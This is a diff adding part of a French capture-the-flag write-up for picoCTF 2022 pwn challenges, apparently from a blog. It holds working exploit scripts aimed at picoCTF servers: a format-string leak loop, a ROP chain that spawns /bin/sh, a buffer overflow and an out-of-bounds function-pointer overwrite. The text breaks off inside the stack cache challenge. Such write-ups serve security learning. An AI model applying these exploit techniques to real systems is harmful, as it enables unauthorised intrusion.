+        data-srcset="/fr/picoctf2022-writeup/datas/flagbof3.png, datas/flagbof3.png 1.5x, /fr/picoctf2022-writeup/datas/flagbof3.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/flagbof3.png"
+        title="flagbof3" /></p>
+<h2 id="flag-leak-pwn">flag leak [Pwn]</h2>
+<p>Format Strings</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
+	<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">50120</span><span class="p">)</span>
+	<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+	<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;%</span><span class="si">{}</span><span class="s1">$s&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
+	<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvall</span><span class="p">()</span>
+	<span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+	<span class="n">sh</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/flagleak.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/flagleak.png, datas/flagleak.png 1.5x, /fr/picoctf2022-writeup/datas/flagleak.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/flagleak.png"
+        title="leak" /></p>
+<p>Flag: picoCTF{L34k1ng_Fl4g_0ff_St4ck_eb9b46a2}</p>
+<h2 id="ropfu-pwn">ropfu [Pwn]</h2>
+<p>What&rsquo;s ROP?</p>
+<p>Static ROP</p>
+<p>J&rsquo;ai créé mon shellcode à partir des gadgets ROP.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">ROPgadget --binary ./vuln --rop --badbytes &#34;0a&#34;
+</code></pre></td></tr></table>
+</div>
+</div><p>Exploit :</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">55455</span><span class="p">)</span>
+
+
+<span class="c1"># ROPgadget --binary ./vuln --rop --badbytes &#34;0a&#34;</span>
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+
+<span class="n">p</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mi">16</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5060</span><span class="p">)</span> <span class="c1"># @ .data</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080b074a</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;/bin&#39;</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08059102</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5064</span><span class="p">)</span> <span class="c1"># @ .data + 4</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080b074a</span><span class="p">)</span> <span class="c1"># pop eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="sa">b</span><span class="s1">&#39;//sh&#39;</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08059102</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x41414141</span><span class="p">)</span> <span class="c1"># padding</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804fb90</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08059102</span><span class="p">)</span> <span class="c1"># mov dword ptr [edx], eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08049022</span><span class="p">)</span> <span class="c1"># pop ebx ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5060</span><span class="p">)</span> <span class="c1"># @ .data</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x08049e39</span><span class="p">)</span> <span class="c1"># pop ecx ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080583c9</span><span class="p">)</span> <span class="c1"># pop edx ; pop ebx ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5068</span><span class="p">)</span> <span class="c1"># @ .data + 8</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x080e5060</span><span class="p">)</span> <span class="c1"># padding without overwrite ebx</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804fb90</span><span class="p">)</span> <span class="c1"># xor eax, eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0808055e</span><span class="p">)</span> <span class="c1"># inc eax ; ret</span>
+<span class="n">p</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s1">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="mh">0x0804a3d2</span><span class="p">)</span> <span class="c1"># int 0x80</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/ropfu.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/ropfu.png, datas/ropfu.png 1.5x, /fr/picoctf2022-writeup/datas/ropfu.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/ropfu.png"
+        title="ropfu" /></p>
+<h2 id="wine-pwn">wine [Pwn]</h2>
+<p>J&rsquo;ai resolu directement ce challenge sans travailler sur le binaire(gdb, etc..)</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">56673</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">128</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x00401530</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/wine.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/wine.png, datas/wine.png 1.5x, /fr/picoctf2022-writeup/datas/wine.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/wine.png"
+        title="wine" /></p>
+<h2 id="function-overwrite-pwn">function overwrite [Pwn]</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/fovchecksec.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/fovchecksec.png, datas/fovchecksec.png 1.5x, /fr/picoctf2022-writeup/datas/fovchecksec.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/fovchecksec.png"
+        title="checksec" /></p>
 <div class="details admonition note open">
         <div class="details-summary admonition-title">
             <i class="icon fas fa-pencil-alt fa-fw"></i>Remarque<i class="details-icon fas fa-angle-right fa-fw"></i>
         </div>
         <div class="details-content">
-            <div class="admonition-content">Pas encore disponible</div>
+            <div class="admonition-content"><p>Quand j&rsquo;ai lu le code, j&rsquo;ai compris que <em>check</em> pointe sur <em>hard_checker</em>.</p>
+<p>Pour l&rsquo;exploiter, il faudrait pointer <em>check</em> sur <em>easy_checker</em>.</p>
+<p>Ensuite, il faut remplir <em>story</em> avec des valeurs dont la somme est égale à <em>1337</em></p>
+</div>
         </div>
-    </div></div><div class="post-footer" id="post-footer">
+    </div>
+<p><em>story</em> pourrait être <em>abcdefghijklk</em>, la somme est effectivement égale à <em>1337</em>.</p>
+<p>Pour pointer <em>check</em> sur <em>easy_checker</em>, j&rsquo;ai pensé à  <a href="https://www.martellosecurity.com/kb/mitre/cwe/123/" target="_blank" rel="noopener noreffer">Write-what-where Condition</a></p>
+<p><em>vuln()</em> fonction</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="p">......</span>
+<span class="k">if</span> <span class="p">(</span><span class="n">num1</span> <span class="o">&lt;</span> <span class="mi">10</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">fun</span><span class="p">[</span><span class="n">num1</span><span class="p">]</span> <span class="o">+=</span> <span class="n">num2</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="p">.....</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>On va se servir du tableau d&rsquo;entier <em>fun</em> pour accéder à <em>check</em> afin de le pointer sur <em>easy_checker</em>.</p>
+<p>On va utiliser l&rsquo;indice num1 du tableau <em>fun</em> pour accéder à <em>check</em> et num2 pour modifier sa valeur.</p>
+<p>Premièrement, on détermine l&rsquo;offset entre <em>fun</em> et <em>check</em> pour le <em>num1</em>.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/funcheck.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/funcheck.png, datas/funcheck.png 1.5x, /fr/picoctf2022-writeup/datas/funcheck.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/funcheck.png"
+        title="funcheck" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">0x0804c040  check
+0x0804c080  fun
+</code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="mh">0x0804c080</span> <span class="o">-</span> <span class="mh">0x0804c040</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">fun</span> <span class="o">-</span> <span class="n">check</span> <span class="o">=</span> <span class="mi">64</span>
+<span class="n">fun</span> <span class="o">-</span> <span class="mi">64</span> <span class="o">=</span> <span class="n">check</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Pour accéder à <em>check</em> il faut soustraire 64 de l&rsquo;adresse de <em>fun</em>.</p>
+<p>Comme num1 est de type int, <strong>num1 = -64/sizeof(int)</strong></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/check.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/check.png, datas/check.png 1.5x, /fr/picoctf2022-writeup/datas/check.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/check.png"
+        title="check" /></p>
+<p>Deuxiement, on pointe <em>check</em> sur <em>easy_checker</em>.</p>
+<p><em>check</em> pointe sur <em>hard_checker</em></p>
+<p>Pour le pointer sur <em>easy_checker</em>, il faut d&rsquo;abord déterminer l&rsquo;offset entre <em>hard_checker</em> et <em>easy_checker</em>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="mh">0x8049436</span> <span class="o">-</span> <span class="mh">0x80492fc</span> <span class="o">=</span> <span class="mi">314</span>
+<span class="n">hard_checker</span> <span class="o">-</span> <span class="n">easy_checker</span> <span class="o">=</span> <span class="mi">314</span>
+<span class="n">hard_checker</span> <span class="o">-</span> <span class="mi">314</span> <span class="o">=</span> <span class="n">easy_checker</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Donc, pour pointer <em>check</em> sur <em>easy_checker</em> il faut soustraire 314 de l&rsquo;adresse de <em>hard_checker</em>.
+Comme <em>check</em> contient l&rsquo;adresse de <em>hard_checker</em>, on dimunie sa valeur de 314.</p>
+<p><strong>num2 = -314</strong></p>
+<p>Exploit:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;saturn.picoctf.net&#34;</span><span class="p">,</span><span class="mi">53163</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;abcdefghijklk&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="sa">b</span><span class="s2">&#34;-16 -314&#34;</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Result:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="datas/foverwrite.png"
+        data-srcset="/fr/picoctf2022-writeup/datas/foverwrite.png, datas/foverwrite.png 1.5x, /fr/picoctf2022-writeup/datas/foverwrite.png 2x"
+        data-sizes="auto"
+        alt="/fr/picoctf2022-writeup/datas/foverwrite.png"
+        title="flag" /></p>
+<h2 id="stack-cache-pwn">stack cache [Pwn]</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define BUFSIZE 16
+</span><span class="cp">#define FLAGSIZE 64
+</span><span class="cp"></span>
+<span class="kt">void</span> <span class="nf">win</span><span class="p">()</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="n">FLAGSIZE</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">filler</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
+  <span class="n">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;flag.txt&#34;</span><span class="p">,</span><span class="s">&#34;r&#34;</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">f</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s %s&#34;</span><span class="p">,</span> <span class="s">&#34;Please create &#39;flag.txt&#39; in this directory with your&#34;</span><span class="p">,</span>
+                    <span class="s">&#34;own debugging flag.</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+  <span class="p">}</span>
+
+  <span class="n">fgets</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="n">FLAGSIZE</span><span class="p">,</span><span class="n">f</span><span class="p">);</span> <span class="c1">// size bound read
+</span><span class="c1"></span><span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>La fonction <strong>win()</strong> ne permet pas d&rsquo;afficher le flag mais de lire çà dans le tableau buf.</p>
+<p>Il nous faut chercher une manière de divulguer le flag contenu dans tableau buf.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="cp">#define BUFSIZE 16
+</span><span class="cp"></span><span class="kt">void</span> <span class="nf">UnderConstruction</span><span class="p">()</span> <span class="p">{</span>
+        <span class="c1">// this function is under construction
+</span><span class="c1"></span>        <span class="kt">char</span> <span class="n">consideration</span><span class="p">[</span><span class="n">BUFSIZE</span><span class="p">];</span>
+        <span class="kt">char</span> <span class="o">*</span><span class="n">demographic</span><span class="p">,</span> <span class="o">*</span><span class="n">location</span><span class="p">,</span> <span class="o">*</span><span class="n">identification</span><span class="p">,</span> <span class="o">*</span><span class="n">session</span><span class="p">,</span> <span class="o">*</span><span class="n">votes</span><span class="p">,</span> <span class="o">*</span><span class="n">dependents</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">p</span><span class="p">,</span><span class="o">*</span><span class="n">q</span><span class="p">,</span> <span class="o">*</span><span class="n">r</span><span class="p">;</span>
+	<span class="c1">// *p = &#34;Enter names&#34;;
+</span><span class="c1"></span>	<span class="c1">// *q = &#34;Name 1&#34;;
+</span><span class="c1"></span>	<span class="c1">// *r = &#34;Name 2&#34;;
+</span><span class="c1"></span>        <span class="kt">unsigned</span> <span class="kt">long</span> <span class="o">*</span><span class="n">age</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;User information : %p %p %p %p %p %p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">demographic</span><span class="p">,</span> <span class="n">location</span><span class="p">,</span> <span class="n">identification</span><span class="p">,</span> <span class="n">session</span><span class="p">,</span> <span class="n">votes</span><span class="p">,</span> <span class="n">dependents</span><span class="p">);</span>
